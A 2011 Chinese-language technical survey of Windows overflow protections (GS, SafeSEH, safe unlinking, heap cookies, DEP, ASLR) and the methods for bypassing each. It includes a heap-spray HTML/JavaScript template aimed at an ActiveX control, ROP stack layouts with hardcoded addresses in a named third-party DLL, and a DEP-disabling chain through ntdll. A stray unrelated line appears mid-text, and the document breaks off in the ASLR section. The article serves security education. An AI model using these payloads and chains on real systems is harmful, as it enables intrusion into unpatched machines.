
# windows 溢出保护原理与绕过方法概览 V2.0(2011/5/9 更新)

> 原文：[`www.pediy.com/kssd/pediy11/123572.html`](https://www.pediy.com/kssd/pediy11/123572.html)

Windows 溢出保护原理与绕过方法概览 V2.0

By : riusksk（泉哥）

Blog: http://riusksk.blogbus.com

Data: 第 1 版：2010/10/26
第 2 版：2011/3/26

## 前言

从 20 世纪 80 年代开始，在国外就有人开始讨论关于溢出的攻击方式。但是在当时并没有引起人们的注意，直至后来经一些研究人员的披露后，特别是著名黑客杂志 Phrack 上面关于溢出的经典文章，引领许多人步入溢出研究的行列，从此关于缓冲区溢出的问题才为人们所重视。随着溢出研究的深入，网上开始出现很多关于溢出攻击教程，揭露了许多溢出利用技术，特别是经典的 `call/jmp esp`，借此溢出攻击案例层出不穷。这也引起了微软的重视，他们在 `windows` 系统及 `VC++` 编译器上加入了各种溢出保护机制，以试图阻止这类攻击，可惜每次公布溢出保护机制之后，不久就有人公布绕过方法。MS 每次都称某保护机制将成为溢出利用的末日，可惜每次都被终结掉。既而，黑客与微软之间的溢出斗争一直持续着。更多关于 `windows` 溢出的历史，可参见由 Abysssec 安全组织编写的文章《Past，Present，Future of Windows Exploitation》[`http://www.abysssec.com/blog/2010/05/past-present-future-of-windows-exploitation/`](http://www.abysssec.com/blog/2010/05/past-present-future-of-windows-exploitation/)。在本篇文章中主要揭露了 `windows` 平台上的各种溢出保护机制原理以及绕过方法，具体内容参见下文。

## 一、GS 编译选项

### 原理

通过 `VC++` 编译器在函数前后添加额外的处理代码，前部分用于由伪随机数生成的 `cookie` 并放入 `.data` 节段，当本地变量初始化，就会向栈中插入 `cookie`，它位于局部变量和返回地址之间：

```
┏━━━━━━━━┓内存低地址
┃   局部变量     ┃▲
┣━━━━━━━━┫┃
┃security_cookie┃┃
┣━━━━━━━━┫┃栈
┃  入栈寄存器    ┃┃生
┣━━━━━━━━┫┃长
┃    SEH 节点    ┃┃方
┣━━━━━━━━┫┃向
┃   返回地址    ┃┃
┣━━━━━━━━┫┃
┃   函数参数    ┃┃
┣━━━━━━━━┫┃
┃   虚函数表    ┃┃
┗━━━━━━━━┛内存高地址
```

经 GS 编译后栈中局部变量空间分配情况：

```
sub   esp,24h
mov   eax,dword ptr [__security_cookie (408040h)]
xor   eax,dword ptr [esp+24h]
mov   dword ptr [esp+20h],eax
```

在函数尾部的额外代码用于在函数返回时，调用 `security_check_cookie()` 函数，以判断 `cookie` 是否被更改过，当函数返回时的情况如下：

```
mov   ecx,dword ptr [esp+20h]
xor   ecx,dword ptr [esp+24h]
add   esp,24h
jmp   __security_check_cookie (4010B2h)
```

在缓冲区溢出利用时，如果将恶意代码从局部变量覆盖到返回地址，那么自然就会覆写 `cookie`，当检测到与原始 `cookie` 不同时（也就是比较上面 `408040h` 与 `4010B2h` 两处 `cookie` 值的比较），就会触发异常，最后终止进程。

### 绕过方法

1. 猜测/计算 `cookie`

`Reducing the Effective Entropy of GS Cookies`：[`http://www.uninformed.org/?v=7&a=2&t=html`](http://www.uninformed.org/?v=7&a=2&t=html)

至从覆盖 SEH 的方法出现后，这种方法目前已基本不用了，它没有后面的方法来得简便。

2. 覆盖 SEH

由于当 `security_check_cookie()` 函数检测到 `cookie` 被更改后，会检查是否安装了安全处理例程，也就是 SEH 节点中保存的指针，如果没有，那么由系统的异常处理器接管，因此我们可以通过（`pop pop ret`）覆盖 SEH 来达到溢出的目的。但对于受 SafeSEH 保护的模块，就可能会导致 exploit 失效，关于它的绕过在后续部分再述。

辅助工具：OD 插件 `safeSEH`、`pattern_create`、`pattern_offset`、`msfpescan`、`memdump`

3. 覆盖虚表指针

堆栈布局：`[局部变量][cookie][入栈寄存器][返回地址][参数][虚表指针]`

当把虚表指针覆盖后，由于要执行虚函数得通过虚表指针来搜索，即可借此劫持 `eip`。

## 二、SafeSEH

### 原理

为了防止 SEH 节点被攻击者恶意利用，微软在 `.net` 编译器中加入 `/sdeseh` 编译选项引入 SafeSEH 技术。编译器在编译时将 PE 文件所有合法的异常处理例程的地址解析出来制成一张表，放在 PE 文件的数据块(LQAJ)一 C0NFIG)中，并使用 shareuser 内存中的一个随机数加密，用于匹配检查。如果该 PE 文件不支持 safesEH，则表的地址为 0。当 PE 文件被系统加载后，表中的内容被加密保存到 `ntdl1.dll` 模块的某个数据区。在 PE 文件运行期间，如果发生异常需要调用异常处理例程，系统会逐个检查该例程在表中是否有记录：如果没有则说明该例程非法，进而不执行该异常例程。

### 绕过方法

1. 利用堆地址覆盖 SEH 结构

在禁用 DEP 的进程中，异常分发例程允许 SEH handler 位于某些非映像页面，除栈空间之外。这也就意味着我们可以把 `shellcode` 放置在堆中，并通过覆盖 SEH 跳至堆空间以执行 `shellcode`，这样即可完全绕过 `safeseh` 保护。

2. 利用 SafeSEH 保护模块之外的地址

对于目前的大部分 `windows` 操作系统，其系统模块都受 SafeSEH 保护，可以选用未开启 SafeSEH 保护的模块来利用，比如漏洞软件本身自带的 `dll` 文件，这个可以借助 OD 插件 SafeSEH 来查看进程中各模块是否开启 SafeSEH 保护。除此之外，也可通过直接覆盖返回地址(`jmp/call esp`)来利用。另一种方法，如果 `esp +8` 指向 `EXCEPTION_REGISTRATION` 结构，那么你仍然可以寻找一个 `pop/pop/ret` 指令组合（在加载模块的地址范围之外的空间），也可以正常工作。但如果你在程序的加载模块中找不到 `pop/pop/ret` 指令，你可以观察下 `esp/ebp`,查看下这些寄存器距离 `nseh` 的偏移，接下来就是查找这样的指令：

`call dword ptr[esp+nn]` / `jmp dword ptr[esp+nn]`

`call dword ptr[ebp+nn]` / `jmp dword ptr[ebp+nn]`

`call dword ptr[ebp-nn]` / `jmp dword ptr[ebp-nn]`

其中的 `nn` 就是寄存器的值到 `nseh` 的偏移，偏移 `nn` 可能是: `esp+8`, `esp+14`, `esp+1c`, `esp+2c`, `esp+44`, `esp+50`, `ebp+0c`, `ebp+24`, `ebp+30`, `ebp-04`, `ebp-0c`, `ebp-18`。

如果遇到以上指令是以 NULL 字节结尾的，可将 `shellcode` 放置在 SEH 之前：

在 `nseh` 上放置向后的跳转指令（跳转 7 字节：`jmp 0xfffffff9`）；
向后跳转足够长的地址以存放 `shellcode`，并借此执行至 `shellcode`；
把 `shellcode` 放在用于覆盖异常处理结构的指令地址之前。

## 三、Safe Unlinking

### 原理

在 Windows XP SP2 之后，堆分配器在从空闲链表中移除堆块时使用 `safe unlinking` 进行保护，防止堆溢出被利用。在使用 `flink` 和 `blink` 指针前，它会验证是否满足以下条件：`Entry->Flink->Blink == Entry->Blink->Flink == Entry`，以防止攻击者使 `flink` 或 `blink` 指向任意内存地址，进而消除在执行 `unlink` 操作时写入任意 4 字节数据的机会。

### 绕过方法

1. 利用旁视列表（lookaside list）

旁视列表（《软件调试》），也叫快表（《0day 安全：软件漏洞分析技术》），它是一张链表，共包含 128 项，每一项对应于一个单向链表。每个单向链表都包含了一组固定大小的空闲块，堆块的大小从 16 字节开始随索引递增依次增加 8 字节。最后一个索引（127）包含了大小为 1024 字节的空闲堆块。每个堆块包含了 8 个字节的块首，用于管理这个堆块。返回给调用者的最小堆块是 16 字节。这样，旁视列表前端分配器没有使用索引为 0 的项，因为这个项对应于大小为 8 个字节的空闲堆块。由于在 `safe unlinking` 过程中，快表被忽略了，当在快表中分配一块空闲块后，若将该空闲块从链表中移除，则该块的 `flink` 指针会写入块首，而系统并未对 `flink` 指针的有效性进行验证，这样就导致在分配下一个同大小的堆块时，它将会把 `flink` 指针返回给新分配的块。如果攻击者能够覆盖快表中的链表头，那么就可以用任意地址来替换 `flink` 指针，并在分配新块时写入任意字节，最后返回被我们修改的地址的值。这一攻击方式最早是由 Matt Conover 在 CanSecWest 2004 黑客大会上公布的《Windows Heap Exploitation(Win2KSP0 through WinXPSP2)》：[`http://cybertech.net/~sh0ksh0k/projects/winheap/XPSP2%20Heap%20Exploitation.ppt`](http://cybertech.net/~sh0ksh0k/projects/winheap/XPSP2%20Heap%20Exploitation.ppt)

实现步骤如下：

```
p = HeapAlloc(n);
FillLookaside(n);
HeapFree(p);
EmptyLookaside(n);
```

利用以下值篡改 `p[0]`（任一堆地址）:

`p->Flags = Busy` （防止偶然发生堆块合并）
`p ->Flink = (BYTE *)&ListHead[(n/8)+1] - 4`
`p ->Blink = (BYTE *)&ListHead[(n/8)+1] + 4`

`HeapAlloc(n);` // 破坏 safe unlinking
`p = HeapAlloc(n);` // 破坏 safe unlinking
// 现在 p 指向 &ListHead[(n/8)].Blink

但在 Windows Vista 之后，快表被低碎片堆（Low-Fragmentation Heap）所代替了，上面的攻击方式就不再适用了。

2. heap spary

`Heap Spary` 技术最早是由 SkyLined 于 2004 年为 IE 的 `iframe` 漏洞写的 exploit 而使用到新技术，目前主要作为浏览器攻击的经典方法，被大量网马所使用。`Heap Spary` 技术是使用 js 分配内存，所分配的内存均放入堆中，然后用各带有 `shellcode` 的堆块去覆盖一大片内存地址，Javascript 分配内存从低址向高址分配，申请的内存空间超出了 `0x0C0C0C0C` 时，`0x0C0C0C0C` 就会被覆盖掉，因此只要让 IE 执行到 `0x0C0C0C0C`（有时也会用 `0x0D0D0D0D` 这一地址）就可以执行 `shellcode`，这些堆块可以用 NOP + shellcode 来填充，每块堆构造 1M 大小即可，当然这也不是固定。这样当 `nop` 区域命中 `0x0c0c0c0c` 时，就可执行在其后面的 `shellcode`。下面是一个简单模板：

```
<html>
<body>
<object classid="clsid:6BE52E1D-E586-474F-A6E2-1A85A9B4D9FB" id="target"></object>
<script>
Var shellcode="\\u68fc\\u7473\\u6668\\u6961……\\u53c4\\u5050\\uff53\\ufc57\\uff53\\uf857";
var nop="\\u9090\\u9090";
while (nop.length <= 0x100000/2)
{
  nop+=nop;
}
nop = nop.substring(0,0x100000/2-32/2-4/2-shellcode.length-2/2);
var slide = new Array();
for ( var i=0; i<200; i++)
{
  slide[i] = nop + shellcode;
}
var s= '';
while (s.length < 748)
{
  s+="\\x0c";
}
target.Overflow(s);
</script>
</body>
</html>
```

## 四、Heap Cookie 及其加密

### 原理

在 `heap header` 中加入 `cookie` 值，原理与栈中的 `cookie` 类似，用于检测堆溢出的发生，`cookie` 被放置在堆首部分原堆块的 `segment table` 的位置，占 1 字节大小，其计算公式如下：

`(AddressOfChunkHeader / 8) XOR Heap->Cookie = Cookie`

即堆块头部地址除以 8，然后跟 Heap 管理结构中的 `cookie` 相异或就得到了 `cookie` 值。

### 绕过方法

1. 猜测/计算 cookie

由于 `cookie` 只有 1 字节，因此共有 256 种可能存在的值，如果通过暴力猜测的话，也是存在被破解的可能。

2. heap spary

具体利用方法同上，这里不再赘述。

## 五、DEP

### 原理

数据执行保护 (`DEP`) 是一套软硬件技术，能够在内存上执行额外检查以防止在不可运行的内存区域上执行代码。在 Microsoft Windows XP Service Pack 2、Microsoft Windows Server 2003 Service Pack 1 、Microsoft Windows XP Tablet PC Edition 2005 、Microsoft Windows Vista 和 windows 7 中，由硬件和软件一起强制实施 DEP。DEP 有两种模式，如果 CPU 支持内存页 NX 属性， 就是硬件支持的 DEP。只有当处理器/系统支持 NX/XD 位（禁止执行）时，windows 才能拥有硬件 DEP，否则只能支持软件 DEP，相当于只有 SafeSEH 保护。

### 绕过方法

1. ret2lib

其思路为：将返回地址指向 lib 库中的代码，而不直接跳转到 `shellcode` 去执行，进而实现恶意代码的运行。可以在库中找到一段执行系统命令的代码，比如 `system()` 函数，用它的地址覆盖返回地址，此时即使 NX/XD 禁止在堆栈上执行代码，但库中的代码依然是可以执行的。函数 `system()` 可通过运行环境来执行其它程序，例如启动 Shell 等等。另外，还可以通过 `VirtualProtect` 函数来修改恶意代码所在内存页面的执行权限，然后再将控制转移到恶意代码，其堆栈布局如下所示：

```
┏━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━┓
┃                        ┃            恶意代码              ┃内存高地址
┃                        ┣━━━━━━━━━━━━━━━━━┫┃
┃                        ┃        lpflOldProtect            ┃┃
┃                        ┣━━━━━━━━━━━━━━━━━┫┃
┃                        ┃          flNewProtect            ┃┃栈
┃      调用参数         ┣━━━━━━━━━━━━━━━━━┫┃
┃                        ┃             dwSize               ┃┃生
┃                        ┣━━━━━━━━━━━━━━━━━┫┃
┃                        ┃            lpAddress             ┃┃长
┃                        ┣━━━━━━━━━━━━━━━━━┫┃
┃                        ┃      恶意代码的入口地址          ┃┃方
┣━━━━━━━━━━━━╋━━━━━━━━━━━━━━━━━┫┃
┃      返回地址          ┃    VirtualProtect 函数地址        ┃┃向
```



进入`/path/to/xxx`目录，找到`xxx.json`。

由于后期系统 dll 加入了 ASDL 保护，因此我们可以选用未开启 ASLR 的第三方 DLL 文件，示例如下（这里使用迅雷 IE 插件）：

`XunleiBHO7.1.6.2194.dll`(DEP/ NO ASLR)

```
.text:211D18F5                  call    ds:VirtualProtect
.text:211D18FB                  pop     esi
.text:211D18FC                  pop     ebp
.text:211D18FD                  retn    0Ch
```

栈空间布局：

`41414141`  垃圾字节（共 3088 字节）

……

`211D18F5`  返回地址

`41414141`  平衡堆栈（视漏洞函数的具体情况而定）

`07c50000`  `lpAddress`(shellcode 地址)

`00001000`   `dwSize`

`00000040`   `flNewProtect` (`PAGE_EXECUTE_READWRITE`)

`07c50020`   `lpflOldProtect` (可写地址)

`41414141`  平衡 `pop esi` 使用的堆栈

`41414141`  平衡 `pop ebp` 使用的堆栈

`07c50000`  返回地址，指向 shellcode

在一次实际利用中，我使用了 COMODO 主动防御软件中的 `guard32.dll` 来定位 `VirtualProtect` 函数：

```
#1002CA33  -FF25 E8F30310    JMP DWORD PTR DS:[1003F3E8]  [Module : guard32.dll]
# jmp to here
#6FFF04C0   8BFF             MOV EDI,EDI
#6FFF04C2   55               PUSH EBP
#6FFF04C3   8BEC             MOV EBP,ESP
#6FFF04C5  -E9 E64BFF06      JMP kernel32.76FE50B0
# jmp to here
#76FE50B0   5D               POP EBP
#76FE50B1  ^E9 02D0FBFF      JMP <JMP.&API-MS-Win-Core-Memory-L1-1-0.VirtualProtect>
# jmp to here
#76FA20B8  -FF25 1019FA76    JMP DWORD PTR DS:[<&API-MS-Win-Core-Memory-L1-1-0.VirtualProtect>; KERNELBA.VirtualProtect
```

关于 `ret2lib` 技术的更多信息可参考资料：http://www.infosecwriters.com/text_resources/pdf/return-to-libc.pdf

## 2.利用 TEB 突破 DEP

在之前的《黑客防线》中有篇文章《SP2 下利用 TEB 执行 ShellCode》，有兴趣的读者可以翻看黑防出版的《缓冲区溢出攻击与防范专辑》，上面有这篇文章。该作者在文中提到一种利用 TEB（线程环境块）来突破 DEP 的方法，不过它受系统版本限制，只能在 XP sp2 及其以下版本的 windows 系统上使用，因为更高版本的系统，其 TEB 地址是不固定的，每次都是动态生成的。该方法的具体实现方法如下：

（1）将返回地址覆盖成字符串复制函数的地址，比如 `lstrcpy`，`memcpy` 等等；

（2）在返回地址之后用目标内存地址和 shellcode 地址覆盖，当执行复制操作时，就会将 shellcode 复制到目标内存地址，该目标内存地址位于 TEB 偏移 `0xC00` 的地方，它有 520 字节缓存用于 ANSI-to-Unicode 函数的转换；

（3）复制操作结束后返回到 shellcode 地址并执行它。

此时其堆栈布局如下：

```
┏━━━━━━━┓
【shellcode  】
【save ebp  】
【lstrcpy  】
【TEB 缓存地址  】<= 用于复制结束后返回到 shellcode
【TEB 缓存地址  】
【ShellCode 地址  】
┗━━━━━━━┛
```

## 3.利用 NtSetInformationProcess 关闭 DEP

关于此方法最原始的资料应该是黑客杂志《uninformed》上的文章《Bypassing Windows Hardware-enforced Data Execution Prevention》（http://www.uninformed.org/?v=2&a=4），另外也可以看下本人之前翻译的《突破 win2003 sp2 中基于硬件的 DEP》（http://bbs.pediy.com/showthread.php?t=99045），此方法的主要原理就是利用 `NtSetInformationProcess()` 函数来设置 `KPROCESS` 结构中的相关标志位，进而关闭 DEP，`KPROCESS` 结构中相关标志位情况如下：

```
0:000> dt nt!\_KPROCESS -r
ntdll!\_KPROCESS
. .
+0x06b Flags       : \_KEXECUTE\_OPTIONS
  +0x000 ExecuteDisable     : Pos 0, 1 Bit
  +0x000 ExecuteEnable     : Pos 1, 1 Bit
  +0x000 DisableThunkEmulation   : Pos 2, 1 Bit
  +0x000 Permanent     : Pos 3, 1 Bit
  +0x000 ExecuteDispatchEnable   : Pos 4, 1 Bit
  +0x000 ImageDispatchEnable   : Pos 5, 1 Bit
  +0x000 Spare       : Pos 6, 2 Bits
```

当 DEP 被启用时，`ExecuteDisable` 被置位，当 DEP 被禁用，`ExecuteEnable` 被置位，当 `Permanent` 标志置位时表示这些设置是最终设置，不可更改。代码实现：

```
ULONG ExecuteFlags = MEM_EXECUTE_OPTION_ENABLE;
NtSetInformationProcess(
  NtCurrentProcess(),   // ProcessHandle = -1
  ProcessExecuteFlags,  // ProcessInformationClass = 0x22（ProcessExecuteFlags）
  &ExecuteFlags,        // ProcessInformation = 0x2（MEM_EXECUTE_OPTION_ENABLE）
  sizeof(ExecuteFlags));    // ProcessInformationLength = 0x4
```

具体实现思路（以我电脑上 VirtualBox 虚拟机下的 xp sp3 为例）：

1.将 `al` 设置为 1，比如指令 `mov al,1` / `ret`，然后用该指令地址覆盖返回地址：

```
0:000> lmm ntdll
start    end        module name
7c920000 7c9b3000   ntdll      (pdb symbols)          c:\\symbollocal\\ntdll.pdb\\1751003260CA42598C0FB326585000ED2\\ntdll.pdb
0:000> s 7c920000 l 93000 b0 01 c2 04
7c9718ea  b0 01 c2 04 00 90 90 90-90 90 8b ff 55 8b ec 56  ............U..V
0:000> u 7c9718ea
ntdll!NtdllOkayToLockRoutine:
7c9718ea b001            mov     al,1
7c9718ec c20400          ret     4
```

由于上面的 `ret 4`，因此要再向栈中填充 4 字节（比如 `0xffffffff`）以抵消多弹出的 4 字节，如果选择的指令刚好是 `ret` 则无须再多填充 4 字节。

2.跳转到 `ntdll!LdrpCheckNXCompatibility` 中的部分代码（从 `cmp al,1` 开始，可通过 windbg 下的命令 `uf ntdll!LdrpCheckNXCompatibility` 来查看其反汇编代码），比如以下地址就需要用 `0x7c93cd24` 来覆写堆栈上的第二个地址：

```
ntdll!LdrpCheckNXCompatibility+0x13:
7c93cd24 3c01            cmp     al,1
7c93cd26 6a02            push    2
7c93cd28 5e              pop     esi
7c93cd29 0f84df290200    je      ntdll!LdrpCheckNXCompatibility+0x1a (7c95f70e)  ; 之前已将 al 置 1，故此处实现跳转
```

3.上面跳转后来到这里：

```
0:000> u 7c95f70e
ntdll!LdrpCheckNXCompatibility+0x1a:
7c95f70e 8975fc          mov     dword ptr [ebp-4],esi  ; [ebp-0x4]= esi = 2
;执行到这里的时候会发现 ebp-4(41414141-4 = 4141413d)而导致不可写，因此我们需要在前面调整下 ebp 的值，比如可以使用以下指令：
;- push esp / pop ebp / ret
;- mov esp,ebp / ret
;或者其它可调整 ebp 为可写地址的指令
7c95f711 e919d6fdff      jmp     ntdll!LdrpCheckNXCompatibility+0x1d (7c93cd2f)
```

4.上面跳转后来到：

```
0:000> u 7c93cd2f
ntdll!LdrpCheckNXCompatibility+0x1d:
7c93cd2f 837dfc00        cmp     dword ptr [ebp-4],0
7c93cd33 0f85f89a0100    jne     ntdll!LdrpCheckNXCompatibility+0x4d (7c956831) ; 由于不相等再次实现跳转
```

5.上面跳转后来到：

```
0:000> u 7c956831
ntdll!LdrpCheckNXCompatibility+0x4d:
7c956831 6a04            push    4     ;ProcessInformationLength = 4
7c956833 8d45fc          lea     eax,[ebp-4]
7c956836 50              push    eax      ;ProcessInformation = 2（MEM_EXECUTE_OPTION_ENABLE）
7c956837 6a22            push    22h       ;ProcessInformationClass = 0x22（ProcessExecuteFlags）
7c956839 6aff            push    0FFFFFFFFh
7c95683b e84074fdff      call    ntdll!ZwSetInformationProcess (7c92dc80)
7c956840 e92865feff      jmp     ntdll!LdrpCheckNXCompatibility+0x5c (7c93cd6d)
7c956845 90              nop
```

在这里调用函数 `ZwSetInformationProcess()`，而其参数也刚好达到我们关闭 DEP 的各项要求.

6.最后跳转到函数结尾：

```
0:000> u 7c93cd6d
ntdll!LdrpCheckNXCompatibility+0x5c:
7c93cd6d 5e              pop     esi
7c93cd6e c9              leave
7c93cd6f c20400          ret     4
```

最后的堆栈布局应为：

```
┏━━━━━━━━━━━━━━━━┓
【  AAA……        】   <= 填充数据
【  push esp/pop ebp/ret    】  <= 调整 ebp 为可写地址
【  al=1 地址      】  <= 返回地址
【  0xffffffff      】  <= 平衡堆栈
【LdrpCheckNXCompatibility 指令地址】  <= 指令 cmp al,0x1 的起始地址
【  0xffffffff      】  <= 平衡堆栈
【  "A" x 54       】  <= 调整 NX 禁用后的堆栈
【  call/jmp esp      】
【  shellcode      】    
┗━━━━━━━━━━━━━━━━┛
```

如果在禁用 NX 后，又需要读取 `esi` 或 `ebp`，但此时它们又被我们填充的数据覆盖掉了，那么我们可以使用诸如 `push esp/pop esi/ret` 或者 `push esp/pop ebp/ret` 这样的指令来调整 `esi` 和 `ebp`，以使关闭 DEP 后还能够正常执行。

辅助工具：`ImmDbg pycommand` 插件（`!pvefindaddr depxpsp3`  + `!findantidep`）

## 4.利用 SetProcessDEPPolicy 来关闭 DEP

适用在：Windows XP SP3，Vista SP1 和 Windows 2008。

为了能使这个函数有效，当前的 DEP 策略必须设成 OptIn 或者 OptOut。如果策略被设成

AlwaysOn（或者 AlwaysOff），然后 `SetProcessDEPPolicy` 将会抛出一个错误。如果一个模块

是以/NXCOMPAT 链接的，这个技术也将不会成功。最后，同等重要的是，它这能被进程调

用一次。因此如果这个函数已经被当前进程调用（如 IE8，当程序开始时已经调用它），它

将不成功。

Bernardo Damele 写了一篇关于这一技术的博文：

http://bernardodamele.blogspot.com/2009/12/dep-bypass-with-setprocessdeppolicy.html

函数原型如下：

```
BOOLWINAPI SetprocessDEPPolicy(
  __in DWORD dwFlags
);
```

这个函数需要一个参数，并且这个参数必须设置为 0，以此禁用当前进程的 DEP。

为了在 ROP 链中使用这个函数，你需要在栈上这样设置：

●指向 `SetProcessDEPPolicy` 的指针

●指向 `shellcode` 的指针

●0

指向 `shellcode` 的指针用于确保当 `SetProcessDEPPolicy()` 执行完 ROP 链后会跳到 shellcode。

在 XP SP3 下 `SetProcessDEPPolicy` 的地址是 `7C8622A4`（`kernel32.dll`）

## 5.利用 WPN 与 ROP 技术

`ROP`（Return Oriented Programming）:连续调用程序代码本身的内存地址，以逐步地创建一连串欲执行的指令序列。

`WPM`（Write Process Memory）：利用微软在 `kernel32.dll` 中定义的函数比如：`WriteProcess Memory` 函数可将数据写入到指定进程的内存中。但整个内存区域必须是可访问的，否则将操作失败。

具体实现方法参见我之前翻译的文章《利用 WPN 与 ROP 技术绕过 DEP》：http://bbs.pediy.com/showthread.php?t=119300

## 6.利用 SEH 绕过 DEP



启用 `DEP` 后，就不能使用 `pop` `pop` `ret` 地址了，而应采用 `pop` `reg`/`pop` `reg`/`pop` `esp`/`ret` 指令的地址，指令 `pop esp` 可以改变堆栈指针，`ret` 将执行流转移到 `nseh` 中的地址上（用关闭 `NX` 例程的地址覆盖 `nseh`，用指向 `pop`/`pop`/`pop esp`/`ret` 指令的指针覆盖异常处理器）。

辅助工具：`ImmDbg` 插件 `!pvefindaddr`

### 7.heap spary

具体利用方法同上，这里不再赘述。

## 四、ASLR

原理：`ASLR`（地址空间布局随机化）技术的主要功能是通过对系统关键地址的随机化，防止攻击者在堆栈溢出后利用固定的地址定位到恶意代码并加以运行。它主要对以下四类地址进行随机化：

(1) 堆地址的随机化；
(2) 栈基址的随机化；
(3) `PE` 文件映像基址的随机化；
(4) `PEB` (`Process Environment Block`，进程环境块) 地址的随机化。

它在 `vista`, `windows 2008 server`, `windows7` 下是默认启用的（`IE7` 除外），非系统镜像也可以通过链接选项 `/DYNAMICBASE` (`Visual Studio 2005 SP1` 以上的版本，`VS2008` 都支持) 启用这种保护, 也可手动更改已编译库的 `dynamicbase` 位，使其支持 `ASLR` 技术(把 `PE` 头中的 `DllCharacteristics` 设置成 `0x40` - 可以

使用工具 `PE EXPLORER` 打开库，查看 `DllCharacteristics` 是否包含 `0x40` 就可以知道是否支持 `ASLR` 技术)。另外，也可以使用 `Process Explorer` 来查看是否开启 `ASLR`。启用 `ASLR` 后，即使你原先已经成功构造出 `exploit`，但在系统重启后，你在 `exploit` 中使用的一些固定地址就会被改变，进而导致 `exploit` 失效。

### 绕过方法：

1. 覆盖部分返回地址

对比下 `windows7` 系统启动前后 `OD` 中 `loaddll.exe` 的各模块基址，启动前：

可执行模块

基址       大小       入口       名称       文件版本          路径

```
00400000   00060000   00410070   loaddll                      D:\\riusksk\\TOOL\\Ollydbg\\loaddll.exe
6DDE0000   0008C000   6DDE1FFF   AcLayers   6.1.7600.16385  (  C:\\Windows\\AppPatch\\AcLayers.dll
710E0000   00012000   710E1200   mpr        6.1.7600.16385  (  C:\\Windows\\System32\\mpr.dll
71C50000   00051000   71C79834   winspool   6.1.7600.16385  (  C:\\Windows\\System32\\winspool.drv
747F0000   00017000   747F1C89   userenv    6.1.7600.16385  (  C:\\Windows\\System32\\userenv.dll
750A0000   0001A000   750A2CCD   sspicli    6.1.7600.16385  (  C:\\Windows\\System32\\sspicli.dll
750C0000   0004B000   750C2B6C   apphelp    6.1.7600.16385  (  C:\\Windows\\System32\\apphelp.dll
75190000   0000B000   75191992   profapi    6.1.7600.16385  (  C:\\Windows\\System32\\profapi.dll
75420000   0004A000   75427A9D   KERNELBA   6.1.7600.16385  (  C:\\Windows\\system32\\KERNELBASE.dll
75B50000   0000A000   75B5136C   LPK        6.1.7600.16385  (  C:\\Windows\\system32\\LPK.dll
75B60000   0004E000   75B6EC49   GDI32      6.1.7600.16385  (  C:\\Windows\\system32\\GDI32.dll
```

系统重启后：

可执行模块

基址       大小       入口       名称       文件版本          路径

```
00400000   00060000   00410070   loaddll                      D:\\riusksk\\TOOL\\Ollydbg\\loaddll.exe
6F510000   0008C000   6F511FFF   AcLayers   6.1.7600.16385  (  C:\\Windows\\AppPatch\\AcLayers.dll
715B0000   00012000   715B1200   mpr        6.1.7600.16385  (  C:\\Windows\\System32\\mpr.dll
72170000   00051000   72199834   winspool   6.1.7600.16385  (  C:\\Windows\\System32\\winspool.drv
74C70000   00017000   74C71C89   userenv    6.1.7600.16385  (  C:\\Windows\\System32\\userenv.dll
75520000   0001A000   75522CCD   sspicli    6.1.7600.16385  (  C:\\Windows\\System32\\sspicli.dll
75540000   0004B000   75542B6C   apphelp    6.1.7600.16385  (  C:\\Windows\\System32\\apphelp.dll
75610000   0000B000   75611992   profapi    6.1.7600.16385  (  C:\\Windows\\System32\\profapi.dll
75690000   0004A000   75697A9D   KERNELBA   6.1.7600.16385  (  C:\\Windows\\system32\\KERNELBASE.dll
759B0000   000CC000   759B168B   msctf      6.1.7600.16385  (  C:\\Windows\\System32\\msctf.dll
75E60000   000AC000   75E6A472   msvcrt     7.0.7600.16385  (  C:\\Windows\\system32\\msvcrt.dll
75F10000   0004E000   75F1EC49   GDI32      6.1.7600.16385  (  C:\\Windows\\system32\\GDI32.dll
```

由此可见，各模块基址的高位是随机变化的，而低位是固定不变的，这里 `loaddll.exe` 不受 `ADSL` 保护，所以其基址没有随机化，如果是 `Notepad.exe` 就有启用 `ASLR`，还有其它经链接选项 `/DYNAMICBASE` 编译的程序也会启用 `ASLR`。因此我们可以让填充字符只覆盖到返回地址的一半，由于小端法机器的缘故，其低位地址在前，因此覆盖到的一半地址刚好处于低位，而返回地址的高位我们让它保持不变，所以我们必须在返回地址之前的地址范围内（相当于漏洞函数所在的 255 字节空间地址）查找出一个可跳转到 `shellcode` 的指令，比如 `jmp edx` (关键看哪一寄存器指向 `shellcode`)。除此之外，我们还必须将 `shellcode` 放在返回地址之前，不然连返回地址的高位也覆盖掉了，这是不允许的。纵观此法，相当的有局限性，如果漏洞函数过短，可能就没有我们需要的指令了，这时就得另寻他法了。

2. 利用未启用 ASLR 的模块地址

这与之前绕过 `SafeSEH` 的方法类似，直接在未受 `ASLR` 保护的模块中查找跳转指令的地址来覆盖返回地址或者 `SEH` 结构，比如上方的可执行模块列表中的 `loaddll.exe` 地址就是固定不变，因此我们借助其地址空间中的指令来实现跳板。这个可以通过 `Process Explorer` 或者 `ImmDbg` 命令插件来查看哪些可执行模块未受 `ASDL` 保护 `!ASLRdynamicbase` 或者 `(!pvefindaddr noaslr)`：来查看哪些进程模块启用 `ASLR` 保护。

3. heap spary

具体利用方法同上，这里不再赘述。

4. 利用内存信息泄漏

通过获取内存中某些有用的信息，或者关于目标进程的状态信息，攻击者通过一个可用的指针就有可能绕过 `ASLR`。这种方法还是十分有效的，主要原因如下：

（1）可利用指针检测对象在内存中的映射地址。比如栈指针指向内存中某线程的栈空间地址，或者一静态变量指针可泄露出某一特定 `DLL`/`EXE` 的基址。
（2）通过指针推断出其他附加信息。比如栈桢中的桢指针不仅提供了某线程栈空间地址，而且提供了栈桢中的相关函数，并可通过此指针获得前后栈桢的相关信息。再比如一个数据段指针，通过它可以获得其在内存中的映像地址，以及单数据元素地址。若是堆指针还可获得已分配的数据块地址，这些信息在程序攻击中还是着为有用的。

在 `Vista` 系统的 `ASLR` 中，信息泄漏的可用性更广了。如果攻击者知道内存中某一映射地址，那么他不仅可获取对应进程中的 `DLL` 地址，连系统中运行的所有进程也会遭殃。因为其他进程在重新加载同一 `DLL` 时，是通过特定地址上的 `\_MiImageBitMap` 变量来搜索内存中的 `DLL` 地址的，而这一 `bitmap` 又被用于所有进程，因此找到一进程中某 `DLL` 的地址，即可在所有进程的地址空间中定位出该 `DLL` 地址。

5. 利用 SystemCall

（1）在 `SystemCall` 地址 `0x7ffe0300` 上是没有被随机化的，下面是我在 `win7` 中文旗舰版上的情况：

```
0:000> dt \_KUSER\_SHARED\_DATA 0x7ffe0000
